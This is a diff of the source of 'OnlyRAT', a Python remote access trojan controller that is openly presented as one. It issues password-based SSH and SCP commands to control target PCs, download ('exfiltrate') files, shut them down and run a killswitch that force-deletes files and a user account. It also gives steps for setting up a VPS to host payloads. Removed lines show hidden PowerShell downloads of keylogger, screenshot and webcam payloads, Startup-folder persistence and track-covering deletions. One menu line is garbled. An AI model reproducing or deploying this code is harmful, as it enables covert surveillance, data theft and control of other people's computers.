@@ -25,28 +25,22 @@ banner = """
 o0    _o0"` '`   NN    NN Ll  Yy,yYY  '^%%&VGh%%%%%&&"^%_,,       "%%%,_      _,.,_  
 0o,_,oo0"        NN    NN Ll   `YyY`    ``'"lIG9ubHkg,,""''`        ""%%>_,;VyIG5lZ;,   
 "00O"`                                          ``'``""UkFUIHlvdSdsbCBldm;"       `"WQ=,
+
+                 [::] The Only RAT You'll Ever Need [::]
+                    [::] Created By : Blue Cosmo [::]
 """
-
-#                                   _..----.._    _       
-#                                 .'  .--.    "-.(0)_     
-#                     '-.__.-'"'=:|   ,  _)_ \\__ . c\\'-.. 
-#                                  '''------'---''---'-"
-#       ::::::::  ::::    ::: :::     :::   ::: :::::::::      ::: ::::::::::: 
-#     :+:    :+: :+:+:   :+: :+:     :+:   :+: :+:    :+:   :+: :+:   :+:      
-#    +:+    +:+ :+:+:+  +:+ +:+      +:+ +:+  +:+    +:+  +:+   +:+  +:+       
-#   +#+    +:+ +#+ +:+ +#+ +#+       +#++:   +#++:++#:  +#++:++#++: +#+        
-#  +#+    +#+ +#+  +#+#+# +#+        +#+    +#+    +#+ +#+     +#+ +#+         
-# #+#    #+# #+#   #+#+# #+#        #+#    #+#    #+# #+#     #+# #+#          
-# ########  ###    #### ########## ###    ###    ### ###     ### ###  
-  
-#                   [::] The Only RAT You'll Ever Need [::]
-#                     [::] Created By : Blue Cosmo [::]
-
 
 # help menu
 help_menu = """
         [+] Arguments:
-            <username>.rat = configuration file 
+            <username>.rat ------------ Access Target Via Config File
+            -d, --dfig <vps_user> ----- Download RAT Config File 
+            -s, --setup --------------- Setup VPS
+            -m, --man ----------------- OnlyRAT Manual
+            -v, --version ------------- OnlyRAT Version
+            -u, --update -------------- Update OnlyRAT
+            -r, --remove -------------- Uninstall OnlyRAT
+            -h, --help  --------------- Help Menu
 
         [+] Example:
             onlyrat bluecosmo.rat
@@ -55,36 +49,31 @@ help_menu = """
 # option menu
 options_menu = """
         [+] Command and Control:
-            [orconsole] ------ Remote Console
-            [fix orconsole] -- Fix Remote Console
-            [upload] --------- Upload File 
-            [downlaod] ------- Download File
-            [restart] -------- Restart Target PC
-            [shutdown] ------- Shutdown Target PC
-            [killswitch] ----- Removes OnlyRAT From Target
+            [orconsole] -------------- Remote Console
+            [fix orconsole] ---------- Fix Remote Console
+            [upload] ----------------- Uplowebhooks.logart Target PC
+            [set connection local] --- Sets Connection to Local
+            [set connection remote] -- Sets Connection to Remote
+            [restart] ---------------- Restart Target PC
+            [shutdown] --------------- Shutdown Target PC
+            [killswitch] ------------- Removes OnlyRAT From Target
 
-        [+] Reconnaissance:
-            [install keylogger] ------ Install Keylogger
-            [install screencapture] -- Install ScreenCapture
-            [install webcam] --------- Install WebCam Capture
-            [grab keylogs] ----------- Grab Keylogs
-            [grab screenshots] ------- Grab ScreenShots From ScreenCapture
-            [grab webcam] ------------ Grab WebCam Photos
+        [+] Payloads:
+            Coming Soon...
 
         [+] Options:
-            [help] ------- Help Menu
-            [man] -------- Onlyrat Manual
-            [config] ----- Display RAT File
-            [version] ---- Version Number
-            [update] ----- Update OnlyRAT
-            [uninstall] -- Uninstall OnlyRAT
-            [quit] ------- Quit
+            [help] ------------------- Help Menu
+            [man] -------------------- Onlyrat Manual
+            [config] ----------------- Display RAT File
+            [version] ---------------- Version Number
+            [update] ----------------- Update OnlyRAT
+            [uninstall] -------------- Uninstall OnlyRAT
+            [quit] ------------------- Quit
 
             * any other commands will be 
               sent through your terminal
 
         [*] Select an [option]...
-
 """
 
 username = getpass.getuser() # gets username
@@ -117,25 +106,11 @@ def read_config(config_file):
     configuration["PASSWORD"] = read_lines[1].strip()
     configuration["WORKINGDIRECTORY"] = (read_lines[2]).replace("\\", "/").strip()
     configuration["STARTUPDIRECTORY"] = (read_lines[3]).replace("\\", "/").strip()
+    configuration["REMOTEHOST"] = read_lines[4].strip()
+    configuration["PORT"] = read_lines[5].strip()
+    configuration["CONNECT"] = read_lines[6].strip()
 
     return configuration
-
-# gets webhooks
-def get_webhooks():
-    # dicitonary for output
-    webhoooks = {}
-
-    # read webhook logs
-    webhook_log = open("webhooks.log", "r").readlines()
-
-    # assign webhook to value
-    webhooks["KEYLOG"] = webhook_log[0].strip()
-    webhooks["WEBCAM"] = webhook_log[1].strip()
-    webhooks["SCREEN"] = webhook_log[2].strip()
-    webhooks["WCREDS"] = webhook_log[3].strip()
-
-    # reutnr data
-    return webhooks
 
 # display configuration file data
 def print_config(configuration):
@@ -158,127 +133,71 @@ def current_date():
 
     return current.strftime("%m-%d-%Y_%H-%M-%S")
 
+# edit connection type
+def edit_connection(rat_file, connection):
+
+    # get current configuration
+    lines = open(rat_file, "r").readlines()
+
+    # add new connection type
+    lines[6] = connection
+
+    # rewrite configuration file
+    with open(rat_file, "w") as rat:
+        for line in lines:
+            rat.write(line)
+
 # connects rat to target
-def connect(address, password):
+def connect(address, password, port):
     print("\n [*] Connecting to target...")
 
-    # remotely connect
-    os.system(f"sshpass -p \"{password}\" ssh onlyrat@{address}")
+    os.system(f"sshpass -p \"{password}\" ssh onlyrat@{address} -p {port}")
 
 # remote uploads with SCP
-def remote_upload(address, password, upload, path):
+def remote_upload(address, password, upload, path, port):
 
     print("\n[*] Starting Upload...")
 
     # scp upload
-    os.system(f"sshpass -p \"{password}\" scp {upload} onlyrat@{address}:{path}")
+    os.system(f"sshpass -p \"{password}\" scp -P {port} -r {upload} onlyrat@{address}:{path}")
 
     print("[+] Upload complete\n")
 
-
 # remote download with SCP
-def remote_download(address, password, path):
+def remote_download(address, password, path, port):
 
     print("\n[*] Starting Download...")
 
     # scp download
     os.system("mkdir ~/Downloads")
-    os.system(f"sshpass -p \"{password}\" scp -r onlyrat@{address}:{path} ~/Downloads")
+
+    os.system(f"sshpass -p \"{password}\" scp -P {port} onlyrat@{address}:{path} ~/Downloads")
 
     print("[+] Download saved to \"~/Downloads\"\n")
 
 # run commands remotely with SCP
-def remote_command(address, password, command):
-    # remote command execution 
-    os.system(f"sshpass -p \"{password}\" ssh onlyrat@{address} '{command}'")
+def remote_command(address, password, command, port):
 
-# keylogger
-def keylogger(address, password, username, working):
-
-    print("\n[*] Prepping keylogger...")
-    # web requests
-    keylogger_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/keylogger.ps1 -OutFile {working}/KHRgMHYmdT.ps1\""
-    controller_command = f"cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && echo powershell Start-Process powershell.exe -windowstyle hidden $env:temp/KHRgMHYmdT.ps1 >> GiLqXiexKP.cmd"
-    print("[+] Keylogger prepped")
-
-    # installing keylogger
-    print("[*] Installing keylogger...")
-    remote_command(address, password, keylogger_command)
-    print("[*] Installing controller...")
-    remote_command(address, password, controller_command)
-    print("[+] Keylogger installed sucessfully\n")
-
-    # execute logger
-    print("\n[!] Restart target computer to execute")
-
-# takes screenshots off of target
-def grab_screenshots(address, password, working, username):
-    # download screenshot
-    print("\n[*] Downloading screenshots...")
-    screenshot_location = f"{working}/amETlOMhPo"
-    remote_download(address, password, screenshot_location)
-    print("[+] Screenshots downloaded")
-
-    # formatting screenshots
-    print("[*] Fromatting screenshots...")
-    loot_folder = f"screenshots-{username}-{current_date()}"
-    os.system(f"mkdir ~/Downloads/{loot_folder}")
-    os.system(f"mv ~/Downloads/amETlOMhPo/* ~/Downloads/{loot_folder}")
-    os.system(f"rm -rf ~/Downloads/amETlOMhPo")
-    print("[+] Screenshots formatted")
-
-    # deletes screenshots off of target
-    print("[*] Covering tracks...")
-    delete_screenshots = f"powershell Remove-Item {working}/amETlOMhPo/*"
-    remote_command(address, password, delete_screenshots)
-    print("[+] Screenshots downloaded")
-
-    # confirmation
-    print("\n[+] Screenshots downloaded to \"~/Downloads\"\n")
-
-# takes webcam pictures off of target
-def grab_webcam(address, password, working, username):
-    # download webcam photos
-    print("\n[*] Downloading webcam photos...")
-    screenshot_location = f"{working}/bNOEXCxyVp"
-    remote_download(address, password, screenshot_location)
-    print("[+] Photos downloaded")
-
-    # formatting webcam photos
-    print("[*] Fromatting photos...")
-    loot_folder = f"webcam-{username}-{current_date()}"
-    os.system(f"mkdir ~/Downloads/{loot_folder}")
-    os.system(f"mv ~/Downloads/bNOEXCxyVp/* ~/Downloads/{loot_folder}")
-    os.system(f"rm -rf ~/Downloads/bNOEXCxyVp")
-    print("[+] Photos formatted")
-
-    # deletes photos off of target
-    print("[*] Covering tracks...")
-    delete_screenshots = f"powershell Remove-Item {working}/bNOEXCxyVp/*.bmp"
-    remote_command(address, password, delete_screenshots)
-    print("[+] Photos downloaded")
-
-    # confirmation
-    print("\n[+] Photos downloaded to \"~/Downloads\"\n")
+    os.system(f"sshpass -p \"{password}\" ssh onlyrat@{address} -p {port} '{command}'")
 
 # killswitch
-def killswitch(address, password, working, username):
+def killswitch(address, password, working, username, port):
     print("\n[*] Prepping killswitch...")
     # web requests
-    killswitch_command = f"powershell /c cd C:; Remove-Item {working}/* -r -Force; Remove-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0; Remove-Item \"C:/Users/onlyrat\" -r -Force; Remove-LocalUser -Name \"onlyrat\"; shutdown /r"
+    killswitch_command = f"powershell /c Remove-Item {working}/* -r -Force; Remove-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0; Remove-Item \"C:/Users/onlyrat\" -r -Force; Remove-LocalUser -Name \"onlyrat\"; shutdown /r"
     print("[+] Killswitch prepped")
 
     # installing killswitch
     print("[*] Executing killswitch...")
-    remote_command(address, password, f"cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && del GiLqXiexKP.cmd")
-    remote_command(address, password, killswitch_command)
+    remote_command(address, password, f"cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && del *.cmd", port)
+    remote_command(address, password, killswitch_command, port)
     print("[+] Killswitch Executed sucessfully\n")
        
     # execute logger
     print("\n[*] Restarting target computer...")
 
 # custom upload
-def upload(address, password, working):
+def upload(address, password, working, port):
 
     # get upload file
     print("\n[~] Enter file you wish to upload :")
@@ -286,11 +205,11 @@ def upload(address, password, working):
 
     # upload file
     print("\n[*] Uploading...")
-    remote_upload(address, password, upload_file, working)
+    remote_upload(address, password, upload_file, working, port)
     print(f"[+] Uploaded sucessfully to \"{working}\"\n")
 
 # custom download
-def download(address, password):
+def download(address, password, port):
 
     # get download path
     print("\n[~] Enter path of file you wish to download :")
@@ -298,7 +217,7 @@ def download(address, password):
 
     # download file
     print("\n[*] Downloading...")
-    remote_download(address, password, download_file)
+    remote_download(address, password, download_file, port)
 
 # update OnlyRAT
 def update():
@@ -325,7 +244,7 @@ def update():
         
         # update
         if option == "y":
-            os.system(f"sh ~/.OnlyRAT/payloads/update.sh")
+            os.system(f"bash ~/.OnlyRAT/payloads/update.sh")
 
         # exception
         else:
@@ -354,164 +273,308 @@ def remove():
     if option == "n":
         main()
 
+# download configuration file
+def download_config():
+
+    # user input, address
+    print("[~] What is the VPS User? : ")
+    user = input(header)
+    print()
+
+    # user input, address
+    print("[~] What is the VPS IP Address? : ")
+    address = input(header)
+    print()
+
+    # format vps
+    vps = f"{user}@{address}"
+
+    # confirm values
+    print("[~] Is The Following Correct? : [y/n]")
+    print(vps)
+    confirm = input(header)
+    print()
+
+    # if yes
+    if confirm == "y" or confirm == "yes":
+        print("[*] Downloading configuration...")
+        os.system(f"scp {vps}:/home/{user}/*.rat .")
+    
+    # if no
+    elif confirm == "n" or confirm == "no":
+        download_config()
+        
+    # exception
+    else:
+        print("[!!] Value Not Recognized")
+
+# setup vps
+def setup_vps():
+    # user input, address
+    print("[~] What is the VPS User? : ")
+    user = input(header)
+    print()
+
+    # user input, address
+    print("[~] What is the VPS IP Address? : ")
+    address = input(header)
+    print()
+
+    # format vps
+    vps = f"{user}@{address}"
+
+    # confirm values
+    print("[~] Is The Following Correct? : [y/n]")
+    print(vps)
+    confirm = input(header)
+    print()
+
+    # if yes
+    if confirm == "y" or confirm == "yes":
+
+            # ssh vps settings
+            print("""
+            [!] READ ALL INSTRUCTIONS CAREFULLY
+                - or folow written instruction here 
+
+            [+] Setting up VPS
+            
+            [1] set up the VPS and edit the ssh file
+
+                nano /etc/ssh/sshd_config 
+            
+            [2] change the following, remove "#"
+
+                AllowTcpForwarding yes
+                GatewayPorts yes 
+
+            [3] save changes and restart ssh
+
+                sudo service ssh restart
+
+            [*] Creating Our SSH Key...
+                - set filename as "key"
+                - set NO PASSWORD
+            """)
+
+            # creating ssh key
+            os.system("ssh-keygen")
+            os.system("chmod 600 key")
+            os.system(f"ssh-copy-id -i key {vps}")
+
+            # confirmation
+            print(f"""
+            [+] The Key Has Been Generated
+
+            [*] To Test It, You Can Run:
+                ssh {vps} -i key
+            
+            [*] Uploading SSH Key to VPS...
+            """)
+
+            # upload ssh key to vps
+            os.system(f"scp -r key {vps}:/home/{user}")
+
+            # final vps settings
+            print("""
+            [+] The Key Has Been Uploaded
+                - You may need to move the key to '/var/www/html' 
+                if you plan to use apache2 for your webserver
+
+            [4] Make Your Key Readable
+                
+                chmod +r key
+
+            [5] Add OnlyRAT to Web Server
+
+                git clone https://github.com/cosmodiumcs/onlyrat.git
+
+            [6] On Line 2 of '/installers/from-vps.cmd', 
+                Add Your VPS IP Address
+
+            [7] On Line 2 of '/payloads/v1.cmd', 
+                Add Your VPS IP Address 
+
+            [8] On Lines 3-5 of '/payloads/v2.ps1', 
+                Fill in The Appropiate Values 
+
+            [9] Start Web Server
+
+                python3 -http.server 80
+                # or
+                sudo service start apache2
+
+            [+] Congrats! You are all set up!
+            """)
+
+    # if no
+    elif confirm == "n" or confirm == "no":
+        setup_vps()()
+        
+    # exception
+    else:
+        print("[!!] Value Not Recognized")
+
 # command line interface
 def cli(arguments):
     # display banner
     clear()
 
-    # listener
-    # if sys.argv[1] == "listener":
-    #     listener()
-
     print(banner)
 
     # if arguments exist
     if arguments:
-        print("\t[~] Type \"help\" for help menu :\n")
 
-        # loop user input
-        while True:
+        argument = sys.argv[1]
 
-            # user input, option
-            option = input(header)
+        if argument.endswith(".rat"):
+            print("\t[~] Type \"help\" for help menu :\n")
 
-            # check if configuration file exists
-            try:
-                configuration = read_config(sys.argv[1])
-        
-            except FileNotFoundError: 
-                print("\n[!!] File does not exist")
-                exit()
+            # loop user input
+            while True:
 
-            # get config info
-            ipv4 = configuration.get("IPADDRESS")
-            password = configuration.get("PASSWORD")
-            working_direcory = configuration.get("WORKINGDIRECTORY")
-            startup_direcory = configuration.get("STARTUPDIRECTORY")
-            target_username = working_direcory[9:-19]
+                # user input, option
+                option = input(header)
+                rat_file = argument
 
-            # remote console
-            if option == "orconsole":
-                connect(ipv4, password)
-
-            # fix remote console
-            if option == "fix orconsole":
-                os.system(f"sh {local_path}/payloads/fix-orconsole.sh {local_path} {ipv4} {password}")
-
-            # keylogger option
-            elif option == "install keylogger":
-                keylogger(ipv4, password, target_username, working_direcory)
+                # check if configuration file exists
+                try:
+                    configuration = read_config(rat_file)
             
-            # grab keylogs option
-            elif option == "grab keylogs":
-                remote_download(ipv4, password, f"{working_direcory}/{target_username}.log")
-                remote_command(ipv4, password, f"powershell New-Item -Path {working_direcory}/{target_username}.log -ItemType File -Force")
+                except FileNotFoundError: 
+                    print("\n[!!] File does not exist")
+                    exit()
 
-                print("[+] Log file saved to \"~/Downloads\"")
-                print("[+] Log file on target has been wiped\n")
+                # get config info
+                local_host = configuration.get("IPADDRESS")
+                password = configuration.get("PASSWORD")
+                working_direcory = configuration.get("WORKINGDIRECTORY")
+                startup_direcory = configuration.get("STARTUPDIRECTORY")
+                remote_host = configuration.get("REMOTEHOST")
+                remote_port = configuration.get("PORT")
+                connection_type = configuration.get("CONNECT")
+                target_username = working_direcory[9:-19]
 
-            # installs screen capture option
-            elif option == "install screencapture":
-                print("\n[*] Installing screen capture...")
-                install_screencaputre = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/screenshot.ps1 -OutFile {working_direcory}/SbQRViPjIq.ps1\""
-                add_to_startup = f"cd C:/Users/{target_username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && echo powershell Start-Process powershell.exe -windowstyle hidden $env:temp/SbQRViPjIq.ps1 >> GiLqXiexKP.cmd"
-
-                remote_command(ipv4, password, install_screencaputre)
-                remote_command(ipv4, password, add_to_startup)
-
-                print("[+] ScreenCapture installed\n")
-                print("\n[!] Restart target computer to execute\n")
-
-            # grab screenshots option
-            elif option == "grab screenshots":
-                grab_screenshots(ipv4, password, working_direcory, target_username)
-
-            # custom upload
-            elif option == "upload":
-                upload(ipv4, password, working_direcory)
-
-            # custom download
-            elif option == "download" or option == "exfiltrate":
-                download(ipv4, password)
-
-            # restart target option
-            elif option == "restart":
-                remote_command(ipv4, password, "shutdown /r")
+                # get current connection type
+                ipv4 = remote_host if connection_type == "remote" else local_host
+                port = remote_port if connection_type == "remote" else "22"
                 
-            # shutdown target option
-            elif option == "shutdown":
-                remote_command(ipv4, password, "shutdown")
+                # remote console
+                if option == "orconsole":
+                    connect(ipv4, password, port)
 
-            # install webcam option
-            elif option == "install webcam":
-                print("\n[*] Installing webcam capture...")
+                # fix remote console
+                elif option == "fix orconsole":
+                    os.system(f"sh {local_path}/payloads/fix-orconsole.sh {local_path} {ipv4} {password} {port}")
 
-                install_webcam = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/webcam.ps1 -OutFile {working_direcory}/bNOEXCxyVp/LIspiXrVAu.ps1\""
-                add_to_startup = f"cd C:/Users/{target_username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && echo powershell cd $env:temp/bNOEXCxyVp; Start-Process powershell.exe -windowstyle hidden $env:temp/bNOEXCxyVp/LIspiXrVAu.ps1 >> GiLqXiexKP.cmd"
+                # set remote connection
+                elif option == "set connection local":
+                    edit_connection(rat_file, "local")
 
-                remote_command(ipv4, password, install_webcam)
-                remote_command(ipv4, password, add_to_startup)
+                # set local connection
+                elif option == "set connection remote":
+                    edit_connection(rat_file, "remote")
 
-                print("[+] Webcam capture installed\n")
-                print("\n[!] Restart target computer to execute\n")
-            
-            # grab webcam photos
-            elif option == "grab webcam":
-                grab_webcam(ipv4, password, working_direcory, target_username)
+                # custom upload
+                elif option == "upload":
+                    upload(ipv4, password, working_direcory, port)
 
-            # help menu
-            elif option == "help":
-                print(banner)
-                print(options_menu)
+                # custom download
+                elif option == "download" or option == "exfiltrate":
+                    download(ipv4, password, port)
 
-            # display config file info
-            elif option == "config":
-                print_config(configuration)
-                print(f"USERNAME : {target_username}")
-            
-            # get version number
-            elif option == "version":
-                os.system(f"cat {local_path}/version.txt")
+                # restart target option
+                elif option == "restart":
+                    remote_command(ipv4, password, "shutdown /r", port)
+                    
+                # shutdown target option
+                elif option == "shutdown":
+                    remote_command(ipv4, password, "shutdown", port)
 
-            # update option
-            elif option == "update":
-                update()
-                exit()
+                # help menu
+                elif option == "help":
+                    print(banner)
+                    print(options_menu)
 
-            # kill switch
-            elif option == "killswitch":
-                print("\n[~] Are you sure you want to remove OnlyRAT from your target [y/n")
-                confirm = input(header)
-                if confirm == "y":
-                    killswitch(ipv4, password, working_direcory, target_username)
+                # display config file info
+                elif option == "config":
+                    print_config(configuration)
+                    print(f"USERNAME : {target_username}")
+                
+                # get version number
+                elif option == "version":
+                    os.system(f"cat {local_path}/version.txt")
 
+                # update option
+                elif option == "update":
+                    update()
+                    exit()
+
+                # kill switch
+                elif option == "killswitch":
+                    print("\n[~] Are you sure you want to remove OnlyRAT from your target [y/n")
+                    confirm = input(header)
+                    if confirm == "y":
+                        killswitch(ipv4, password, working_direcory, target_username, port)
+
+                    else:
+                        main()
+
+                # onlyrat manual
+                elif option == "man" or option == "manual":
+                    os.system(f"xdg-open https://github.com/CosmodiumCS/OnlyRAT/blob/main/payloads/manual.md")
+
+                # remove installation
+                elif option == "remove" or option == "uninstall":
+                    remove()
+
+                # quit option
+                elif option == "quit" or option == "exit":
+                    exit()
+
+                # exception
                 else:
-                    main()
+                    os.system(option)
+                
+                # new line for cleaner UI
+                print("\n")
 
-            # onlyrat manual
-            elif option == "man" or option == "manual":
-                os.system(f"xdg-open https://github.com/CosmodiumCS/OnlyRAT/blob/main/payloads/manual.md")
+        # download configuration file argument
+        elif argument == "--dfig" or argument == "-d" or argument == "--download":
+            download_config()
 
-            # remove installation
-            elif option == "remove" or option == "uninstall":
-                remove()
+        # setup vps argument
+        elif argument == "--setup" or argument == "-s":
+            setup_vps()
 
-            # quit option
-            elif option == "quit" or option == "exit":
-                exit()
+        # onlyrat manual argument
+        elif argument == "--manual" or argument == "-m" or argument == "--man":
+            os.system(f"xdg-open https://github.com/CosmodiumCS/OnlyRAT/blob/main/payloads/manual.md")
 
-            # exception
-            else:
-                os.system(option)
+        # onlyrat version argument
+        elif argument == "--version" or argument == "-v":
+            os.system(f"cat {local_path}/version.txt")
+
+        # update onlyrat argument
+        elif argument == "--update" or argument == "-u":
+            update()
+            exit()
             
-            # new line for cleaner UI
-            print("\n")
+        # remove onlyrat argument
+        elif argument == "--remove" or argument == "-r" or argument == "--uninstall": 
+            remove()
+
+        # help menu argument
+        elif argument == "--help" or argument == "-h":
+            print(help_menu)
+
+        # exception
+        else:
+            print("[!!] Argument Not Recognized")
 
     # if arguments don't exist
     else:
-        # TODO: install webhooks
-        install()
-        # print(help_menu)
+        print(help_menu)
 
 # main code
 def main():
